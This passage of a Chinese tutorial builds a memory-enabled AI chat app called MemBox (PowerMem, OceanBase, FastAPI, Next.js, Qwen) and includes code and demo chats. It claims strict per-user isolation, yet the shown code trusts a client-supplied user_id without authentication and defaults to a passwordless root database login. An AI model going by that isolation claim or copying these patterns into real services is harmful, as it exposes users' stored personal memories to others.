            <span class="hljs-string">"model"</span>: os.getenv(<span class="hljs-string">"EMBEDDING_MODEL"</span>, <span class="hljs-string">"text-embedding-v4"</span>),
            <span class="hljs-string">"embedding_dims"</span>: <span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"EMBEDDING_DIMS"</span>, <span class="hljs-string">"1536"</span>)),
            <span class="hljs-string">"api_key"</span>: os.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>),
        }
    },
    
    <span class="hljs-comment"># 向量存储配置 - SeekDB (OceanBase)</span>
    <span class="hljs-string">"vector_store"</span>: {
        <span class="hljs-string">"provider"</span>: <span class="hljs-string">"oceanbase"</span>,
        <span class="hljs-string">"config"</span>: {
            <span class="hljs-string">"collection_name"</span>: <span class="hljs-string">"memories"</span>,
            <span class="hljs-string">"embedding_model_dims"</span>: <span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"EMBEDDING_DIMS"</span>, <span class="hljs-string">"1536"</span>)),
            <span class="hljs-string">"host"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_HOST"</span>, <span class="hljs-string">"127.0.0.1"</span>),
            <span class="hljs-string">"port"</span>: <span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"OCEANBASE_PORT"</span>, <span class="hljs-string">"2881"</span>)),
            <span class="hljs-string">"user"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_USER"</span>, <span class="hljs-string">"root@sys"</span>),
            <span class="hljs-string">"password"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_PASSWORD"</span>, <span class="hljs-string">""</span>),
            <span class="hljs-string">"db_name"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_DATABASE"</span>, <span class="hljs-string">"membox"</span>),
        }
    },
}
</code></pre>
<h3 data-id="heading-11">6.2 记忆管理</h3>
<p><code>memory_manager.py</code> 封装了 PowerMem 的核心操作，主要包含两个方法：</p>
<ul>
<li><strong>add_memory</strong>：从对话中提取并保存记忆。通过 <code>infer=True</code> 启用智能提取，PowerMem 会自动从对话中提取事实信息、去重、更新冲突内容并整合相关记忆。通过 <code>user_id</code> 实现用户隔离，每个用户的记忆独立存储。</li>
<li><strong>search_memory</strong>：搜索与查询相关的记忆。通过 <code>add_profile=True</code> 在返回结果中包含用户画像，帮助 LLM 生成更个性化的回复。搜索时会根据 <code>user_id</code> 过滤，只返回当前用户的记忆。</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> powermem <span class="hljs-keyword">import</span> UserMemory
<span class="hljs-keyword">from</span> .config <span class="hljs-keyword">import</span> config

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryManager</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.memory = UserMemory(config=config)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_memory</span>(<span class="hljs-params">self, messages: <span class="hljs-built_in">list</span>, user_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""从对话中提取并保存记忆"""</span>
        result = self.memory.add(
            messages=messages,
            user_id=user_id,
            infer=<span class="hljs-literal">True</span>  <span class="hljs-comment"># 启用智能提取</span>
        )
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_memory</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, user_id: <span class="hljs-built_in">str</span>, limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""搜索相关记忆"""</span>
        results = self.memory.search(
            query=query,
            user_id=user_id,
            limit=limit,
            add_profile=<span class="hljs-literal">True</span>  <span class="hljs-comment"># 同时返回用户画像</span>
        )
        <span class="hljs-keyword">return</span> results
</code></pre>
<h3 data-id="heading-12">6.3 实现 API 路由</h3>
<p><code>routes/memory.py</code> 提供记忆相关的 RESTful API，供前端调用：</p>
<ul>
<li><strong>POST /api/memory/add</strong>：前端在对话结束后调用，将用户和 AI 的对话内容发送到后端进行记忆提取和存储。</li>
<li><strong>POST /api/memory/search</strong>：前端在用户发送新消息前调用，搜索相关记忆和用户画像，注入到 LLM 的系统提示词中。</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, HTTPException
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel
<span class="hljs-keyword">from</span> ..memory_manager <span class="hljs-keyword">import</span> get_memory_manager

router = APIRouter()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AddMemoryRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    messages: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]
    user_id: <span class="hljs-built_in">str</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchMemoryRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    query: <span class="hljs-built_in">str</span>
    user_id: <span class="hljs-built_in">str</span>
    limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span>

<span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">"/add"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_memory</span>(<span class="hljs-params">request: AddMemoryRequest</span>):
    <span class="hljs-string">"""添加记忆"""</span>
    mm = get_memory_manager()
    result = mm.add_memory(
        messages=request.messages,
        user_id=request.user_id
    )
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"success"</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">"result"</span>: result}

<span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">"/search"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_memory</span>(<span class="hljs-params">request: SearchMemoryRequest</span>):
    <span class="hljs-string">"""搜索记忆"""</span>
    mm = get_memory_manager()
    results = mm.search_memory(
        query=request.query,
        user_id=request.user_id,
        limit=request.limit
    )
    <span class="hljs-keyword">return</span> results
</code></pre>
<h2 data-id="heading-13">7. 添加多模态支持</h2>
<p>MemBox 支持图片理解功能，用户可以上传图片并提问。整体流程如下：</p>
<ol>
<li><strong>图片上传</strong>：用户选择图片，前端上传到后端获取 URL，用于在聊天历史记录中显示图片预览。</li>
<li><strong>图片理解</strong>：前端将图片 URL 传给 Vercel AI SDK，SDK 自动下载图片并转成 base64 发送给 qwen-vl-plus。</li>
<li><strong>记忆保存</strong>：LLM 的回复（包含对图片的理解描述）作为文本保存到 PowerMem 中。</li>
</ol>
<p>这样做的好处是后端只需提供简单的图片存储服务，多模态理解由 Vercel AI SDK 和前端统一处理。</p>
<blockquote>
<p><strong>注意</strong>：PowerMem 也原生支持多模态记忆，可以在配置中设置 <code>enable_vision: True</code> 和 <code>vision_details: "auto"</code> 并配置相应的多模态模型（如 qwen-vl-plus），让后端直接理解图片内容并存储为记忆。具体参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fpowermem%2Fblob%2Fmain%2Fdocs%2Fexamples%2Fscenario_7_multimodal.md" target="_blank" title="https://github.com/oceanbase/powermem/blob/main/docs/examples/scenario_7_multimodal.md" ref="nofollow noopener noreferrer">PowerMem 多模态示例</a>。</p>
</blockquote>
<h3 data-id="heading-14">7.1 图片上传 API</h3>
<p>后端 <code>routes/upload.py</code> 提供图片上传接口，将图片保存到本地并返回访问 URL：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">"/images"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_images</span>(<span class="hljs-params">
    files: <span class="hljs-type">List</span>[UploadFile] = File(<span class="hljs-params">...</span>),
    user_id: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>)
</span>):
    <span class="hljs-keyword">try</span>:
        uploaded_urls = []
        uploaded_filenames = []
        
        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
            <span class="hljs-comment"># Check file type</span>
            ext = get_file_extension(file.filename)
            <span class="hljs-keyword">if</span> ext <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS:
                <span class="hljs-keyword">raise</span> HTTPException(...)
            
            <span class="hljs-comment"># Generate filename and save</span>
            filename = generate_filename(file.filename)
            filepath = os.path.join(UPLOAD_DIR, filename)
            
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
                content = <span class="hljs-keyword">await</span> file.read()
                f.write(content)
            
            <span class="hljs-comment"># Generate image URL</span>
            base_url = os.getenv(<span class="hljs-string">"BASE_URL"</span>, <span class="hljs-string">"http://localhost:8000"</span>)
            image_url = <span class="hljs-string">f"<span class="hljs-subst">{base_url}</span>/uploads/<span class="hljs-subst">{filename}</span>"</span>
            
            uploaded_urls.append(image_url)
            uploaded_filenames.append(filename)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"success"</span>: <span class="hljs-literal">True</span>,
            <span class="hljs-string">"count"</span>: <span class="hljs-built_in">len</span>(uploaded_urls),
            <span class="hljs-string">"filenames"</span>: uploaded_filenames,
            <span class="hljs-string">"urls"</span>: uploaded_urls
        }
    
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># ... error handling</span>
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=<span class="hljs-built_in">str</span>(e))
</code></pre>
<h3 data-id="heading-15">7.2 启动后端</h3>
<p>可以使用以下命令启动后端服务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> backend
uv run membox
</code></pre>
<h2 data-id="heading-16">8. 搭建前端（Next.js + Vercel AI SDK）</h2>
<p>前端基于 Next.js 构建，主要使用以下技术栈：</p>
<ul>
<li>Vercel AI SDK</li>
<li>AI Elements</li>
<li>ui-ux-pro-max-skill</li>
</ul>
<h3 data-id="heading-17">8.1 Vercel AI SDK</h3>
<p>将大语言模型（LLM）集成到应用中是一件复杂的事情，而且高度依赖于你使用的模型提供商。<a href="https://link.juejin.cn?target=https%3A%2F%2Fai-sdk.dev%2F" target="_blank" title="https://ai-sdk.dev/" ref="nofollow noopener noreferrer">Vercel AI SDK</a> 标准化了跨不同提供商的 AI 模型集成方式，让开发者可以专注于构建优秀的 AI 应用，而不是在技术细节上浪费时间。</p>
<p>AI SDK 包含两个主要模块：</p>
<ul>
<li><strong>AI SDK Core</strong>：提供统一的 API，用于生成文本、结构化对象、工具调用以及使用 LLM 构建 Agent。</li>
<li><strong>AI SDK UI</strong>：提供一组与框架无关的 hooks，用于快速构建聊天界面和生成式 UI。</li>
</ul>
<h3 data-id="heading-18">8.2 AI Elements</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai-elements.dev%2F" target="_blank" title="https://ai-elements.dev/" ref="nofollow noopener noreferrer">AI Elements</a> 是基于 shadcn/ui 构建的组件库，帮助开发者更快地构建 AI 原生应用。它提供了预构建的组件，如对话框、消息气泡等，可以通过 CLI 命令快速安装：</p>
<h3 data-id="heading-19">8.3 UI/UX 设计</h3>
<p>本项目使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnextlevelbuilder%2Fui-ux-pro-max-skill" target="_blank" title="https://github.com/nextlevelbuilder/ui-ux-pro-max-skill" ref="nofollow noopener noreferrer">ui-ux-pro-max-skill</a> 辅助设计页面风格和样式。这是一个 AI Skill，能够为多平台提供专业的 UI/UX 设计智能，自动生成设计系统并推荐最佳的颜色、字体和间距方案。</p>
<h3 data-id="heading-20">8.4 聊天状态管理</h3>
<p><code>app/page.tsx</code> 是前端的核心页面，使用多个 hooks 管理状态：</p>
<ul>
<li><strong>useUser</strong>：管理用户登录、切换、登出。</li>
<li><strong>useChatSessions</strong>：管理聊天会话的创建、切换、删除，按用户隔离。</li>
<li><strong>useChat</strong>：Vercel AI SDK 提供的 hook，管理消息发送和接收。</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useChat } <span class="hljs-keyword">from</span> <span class="hljs-string">"@ai-sdk/react"</span>;
<span class="hljs-keyword">import</span> { useChatSessions } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/hooks/use-chat-sessions"</span>;
<span class="hljs-keyword">import</span> { useUser } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/hooks/use-user"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [pendingImages, setPendingImages] = useState&lt;<span class="hljs-built_in">string</span>[]&gt;([]);
  
  <span class="hljs-comment">// 用户管理</span>
  <span class="hljs-keyword">const</span> { currentUser, login, switchUser, logout } = <span class="hljs-title function_">useUser</span>();

  <span class="hljs-comment">// 聊天会话管理（按用户过滤）</span>
  <span class="hljs-keyword">const</span> {
    sessions,
    currentSession,
    currentSessionId,
    createSession,
    updateSessionMessages,
    deleteSession,
    selectSession,
    newChat,
  } = <span class="hljs-title function_">useChatSessions</span>(currentUser?.<span class="hljs-property">id</span> ?? <span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 聊天 hook</span>
  <span class="hljs-keyword">const</span> { messages, sendMessage, status, setMessages, stop } = <span class="hljs-title function_">useChat</span>({
    <span class="hljs-attr">id</span>: currentSessionId || <span class="hljs-literal">undefined</span>,
  });

  <span class="hljs-comment">// 当消息变化时，同步到会话</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (currentSessionId &amp;&amp; messages.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-title function_">updateSessionMessages</span>(currentSessionId, messages);
    }
  }, [messages, currentSessionId, updateSessionMessages]);

  <span class="hljs-comment">// 切换会话时，加载对应的消息</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (currentSession) {
      <span class="hljs-title function_">setMessages</span>(currentSession.<span class="hljs-property">messages</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">setMessages</span>([]);
    }
  }, [currentSessionId, setMessages]);
  
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-21">8.5 发送多模态消息</h3>
<p>构建包含文本和图片的多模态消息（<code>app/page.tsx</code>）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> handleSubmit = <span class="hljs-title function_">useCallback</span>(
  <span class="hljs-keyword">async</span> (<span class="hljs-attr">message</span>: { <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span> }) =&gt; {
    <span class="hljs-keyword">if</span> (!message.<span class="hljs-property">text</span>.<span class="hljs-title function_">trim</span>() &amp;&amp; pendingImages.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 将 userId 存入 cookie，供 API Route 读取</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`membox_user_id=<span class="hljs-subst">${userId}</span>; path=/; max-age=86400`</span>;

    <span class="hljs-comment">// 构建包含图片和文本的 parts 数组</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">parts</span>: <span class="hljs-title class_">Array</span>&lt;
      { <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span>; <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span> } | 
      { <span class="hljs-attr">type</span>: <span class="hljs-string">'file'</span>; <span class="hljs-attr">mediaType</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span> }
    &gt; = [];
    
    <span class="hljs-comment">// 先添加图片</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> url <span class="hljs-keyword">of</span> pendingImages) {
      parts.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'file'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>,
        <span class="hljs-attr">mediaType</span>: <span class="hljs-string">'image/png'</span>,
        <span class="hljs-attr">url</span>: url,
      });
    }
    
    <span class="hljs-comment">// 再添加文本</span>
    parts.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">type</span>: <span class="hljs-string">'text'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>,
      <span class="hljs-attr">text</span>: message.<span class="hljs-property">text</span> || <span class="hljs-string">'Please describe these images'</span>,
    });

    <span class="hljs-comment">// 清空待发送的图片</span>
    <span class="hljs-title function_">setPendingImages</span>([]);

    <span class="hljs-comment">// 发送消息到 /api/chat，由 API Route 调用 LLM</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendMessage</span>({ parts });
  },
  [sendMessage, userId, pendingImages]
);
</code></pre>
<h3 data-id="heading-22">8.6 调用 LLM 生成回复</h3>
<p><code>app/api/chat/route.ts</code> 是前端的核心 API Route，负责：</p>
<ol>
<li><strong>搜索记忆</strong>：调用后端 <code>/api/memory/search</code> 获取相关记忆和用户画像。</li>
<li><strong>调用 LLM</strong>：将记忆上下文注入 System Prompt，调用千问模型生成回复。</li>
<li><strong>保存记忆</strong>：在 LLM 回复完成后，调用后端 <code>/api/memory/add</code> 保存记忆。</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { convertToModelMessages, streamText, consumeStream, <span class="hljs-title class_">UIMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-keyword">import</span> { createOpenAICompatible } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/openai-compatible'</span>;

<span class="hljs-comment">// 创建 Qwen 客户端（兼容 OpenAI 协议）</span>
<span class="hljs-keyword">const</span> qwen = <span class="hljs-title function_">createOpenAICompatible</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'qwen'</span>,
  <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DASHSCOPE_API_KEY</span>,
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">req: Request</span>) {
  <span class="hljs-comment">// 接收前端发送的对话历史（包含 parts 格式的多模态消息）</span>
  <span class="hljs-keyword">const</span> { messages }: { <span class="hljs-attr">messages</span>: <span class="hljs-title class_">UIMessage</span>[] } = <span class="hljs-keyword">await</span> req.<span class="hljs-title function_">json</span>();

  <span class="hljs-comment">// 从 cookie 获取用户 ID</span>
  <span class="hljs-keyword">const</span> cookies = req.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'cookie'</span>) || <span class="hljs-string">''</span>;
  <span class="hljs-keyword">const</span> userIdMatch = cookies.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/membox_user_id=([^;]+)/</span>);
  <span class="hljs-keyword">const</span> userId = userIdMatch?.[<span class="hljs-number">1</span>] ?? <span class="hljs-string">'default_user'</span>;

  <span class="hljs-comment">// 获取最后一条用户消息的文本</span>
  <span class="hljs-keyword">const</span> lastMessage = messages.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> lastMessageText = lastMessage?.<span class="hljs-property">parts</span>?.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">'text'</span>)?.<span class="hljs-property">text</span> ?? <span class="hljs-string">''</span>;

  <span class="hljs-comment">// 检测是否有图片，选择对应模型</span>
  <span class="hljs-keyword">const</span> hasImages = messages.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> m.<span class="hljs-property">parts</span>?.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">'file'</span>));
  <span class="hljs-keyword">const</span> modelName = hasImages ? <span class="hljs-string">'qwen-vl-plus'</span> : <span class="hljs-string">'qwen-plus'</span>;

  <span class="hljs-comment">// 1. 搜索相关记忆</span>
  <span class="hljs-keyword">const</span> backendUrl = process.<span class="hljs-property">env</span>.<span class="hljs-property">NEXT_PUBLIC_BACKEND_URL</span> ?? <span class="hljs-string">'http://localhost:8000'</span>;
  <span class="hljs-keyword">let</span> memoryContext = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> searchRes = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${backendUrl}</span>/api/memory/search`</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
        <span class="hljs-attr">query</span>: lastMessageText,
        <span class="hljs-attr">user_id</span>: userId,
        <span class="hljs-attr">limit</span>: <span class="hljs-number">5</span>,
      }),
    });

    <span class="hljs-keyword">if</span> (searchRes.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">const</span> searchData = <span class="hljs-keyword">await</span> searchRes.<span class="hljs-title function_">json</span>();
      <span class="hljs-comment">// 用户画像</span>
      <span class="hljs-keyword">if</span> (searchData.<span class="hljs-property">profile_content</span>) {
        memoryContext += <span class="hljs-string">`\nUser Profile: <span class="hljs-subst">${searchData.profile_content}</span>`</span>;
      }
      <span class="hljs-comment">// 相关记忆</span>
      <span class="hljs-keyword">if</span> (searchData.<span class="hljs-property">results</span>?.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        memoryContext += <span class="hljs-string">'\n\nRelated Memories:'</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mem <span class="hljs-keyword">of</span> searchData.<span class="hljs-property">results</span>) {
          memoryContext += <span class="hljs-string">`\n- <span class="hljs-subst">${mem.memory}</span>`</span>;
        }
      }
    }
  } <span class="hljs-keyword">catch</span> {
    <span class="hljs-comment">// 忽略记忆搜索错误</span>
  }

  <span class="hljs-comment">// 2. 构建 System Prompt，注入记忆上下文</span>
  <span class="hljs-keyword">const</span> systemPrompt = <span class="hljs-string">`You are MemBox, an intelligent memory assistant...
<span class="hljs-subst">${memoryContext ? <span class="hljs-string">`Here is background information:<span class="hljs-subst">${memoryContext}</span>`</span> : <span class="hljs-string">''</span>}</span>`</span>;

  <span class="hljs-comment">// 3. 调用 LLM</span>
  <span class="hljs-keyword">const</span> modelMessages = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertToModelMessages</span>(messages);
  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">streamText</span>({
    <span class="hljs-attr">model</span>: qwen.<span class="hljs-title function_">chatModel</span>(modelName),
    <span class="hljs-attr">system</span>: systemPrompt,
    <span class="hljs-attr">messages</span>: modelMessages,
    <span class="hljs-comment">// 4. LLM 回复完成后保存记忆</span>
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">onFinish</span>(<span class="hljs-params">{ text }</span>) {
      <span class="hljs-keyword">const</span> conversationToSave = [
        { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: lastMessageText || <span class="hljs-string">'User shared images'</span> },
        { <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>, <span class="hljs-attr">content</span>: text },
      ];
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${backendUrl}</span>/api/memory/add`</span>, {
          <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
          <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
          <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
            <span class="hljs-attr">messages</span>: conversationToSave,
            <span class="hljs-attr">user_id</span>: userId,
          }),
        });
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// 忽略保存错误</span>
      }
    },
  });

  <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">toUIMessageStreamResponse</span>({ <span class="hljs-attr">consumeSseStream</span>: consumeStream });
}
</code></pre>
<h3 data-id="heading-23">8.7 启动前端</h3>
<p>安装依赖并启动前端服务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> frontend
pnpm install
pnpm dev
</code></pre>
<p>访问 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a> 访问页面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6dddedc8eb84b8394c0f74465d34c83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=NLn7qo%2FkX4TLPqxYtjipCGkSgRM%3D" alt="" loading="lazy"/></p>
<p>输入用户名后即可开始聊天对话：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41a30cfef99a42778eaa65e35d47697d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=UnNB10H4AynljOSCBaagMEG8CXs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-24">9. 效果演示</h2>
<h3 data-id="heading-25">9.1 智能记忆</h3>
<p>首先看看 PowerMem 的 <strong>Intelligent Memory（智能记忆）</strong> 功能：</p>
<blockquote>
<p>👤 Seven：我是 Seven，在上海工作，喜欢踢足球</p>
<p>🤖 MemBox：嗨 Seven！上海的足球氛围挺不错的，黄浦区和徐汇区都有很多球场，周末经常能看到业余联赛。你平时都在哪个区域踢球呀？要是你喜欢的话，我还可以推荐几个不错的足球社群给你~</p>
</blockquote>
<p>PowerMem 会将这些信息持久化存储到 SeekDB 中，即使会话结束也不会丢失，随时可以在后续对话中被智能检索和使用。</p>
<h3 data-id="heading-26">9.2 记忆检索</h3>
<p>当用户发起新对话时，MemBox 会<strong>自动根据当前问题检索相关记忆</strong>。这是通过 SeekDB 的向量相似度搜索实现的——将用户问题转换为向量，在记忆库中找到语义最相近的内容。</p>
<p>下次对话时，即使用户没有明确提及之前说过的内容，MemBox 也能智能关联：</p>
<blockquote>
<p>👤 Seven：周末有什么活动推荐？</p>
<p>🤖 MemBox：Hey Seven！既然你在上海而且喜欢踢足球，周未不如来场酣畅淋漓的球局吧！......</p>
</blockquote>
<p>注意，Seven 并没有再次提到"足球"，但 MemBox 自动检索到了之前记忆的兴趣爱好，并据此给出个性化推荐。</p>
<h3 data-id="heading-27">9.3 多模态记忆</h3>
<p>MemBox 不仅能记住文字，还能<strong>理解和记忆图片内容</strong>。当用户上传图片时，前端会调用多模态 LLM（qwen-vl-plus）来理解图片，然后将理解结果作为记忆存储：</p>
<blockquote>
<p>👤 Seven：[上传一张猫的照片] 这是我的猫咪小蓝</p>
<p>🤖 MemBox：哇，小蓝看起来好可爱！这只灰白相间的猫咪趴在柔软的毯子上，阳光洒在它身上，真是治愈系的画面。你一定很爱它吧？猫咪总是能带来温暖和放松的感觉，看着它安静的样子，心情都会变好呢～</p>
</blockquote>
<p>LLM 不仅识别出了猫的品种（英短蓝猫），还将这些信息与用户关联存储。之后再问起时，MemBox 能准确回忆：</p>
<blockquote>
<p>👤 Seven：我的宠物叫什么名字？</p>
<p>🤖 MemBox：你的宠物叫小蓝，是一只灰白相间的猫咪，特别喜欢趴在柔软的毯子上休息。</p>
</blockquote>
<h3 data-id="heading-28">9.4 用户画像</h3>
<p>PowerMem 最强大的功能之一是<strong>自动构建用户画像</strong>。每次对话后，系统会：</p>
<ol>
<li>获取该用户现有的画像（如果有）。</li>
<li>分析新对话，提取新的用户信息。</li>
<li>调用 LLM 将新旧信息智能合并。</li>
<li>更新用户画像。</li>
</ol>
<p>随着对话积累，画像越来越丰富：</p>
<pre><code class="hljs language-diff" lang="diff">👤 用户画像：
<span class="hljs-deletion">- 姓名：Seven</span>
<span class="hljs-deletion">- 工作地点：上海</span>
<span class="hljs-deletion">- 爱好：踢足球</span>
<span class="hljs-deletion">- 宠物：英短蓝猫，名叫小蓝</span>
</code></pre>
<p>PowerMem 搜索返回的结果中会包含 <code>profile_content</code> 字段，将其注入到 LLM 的上下文中，让 AI 在回答时"认识"这个用户。</p>
<h3 data-id="heading-29">9.5 用户隔离</h3>
<p>在多用户场景下，<strong>数据安全和隐私隔离至关重要</strong>。MemBox 通过 <code>user_id</code> 实现严格的用户隔离——每个用户只能访问自己的记忆，无法看到其他用户的数据。</p>
<p><strong>用户 A（Seven）的对话：</strong></p>
<blockquote>
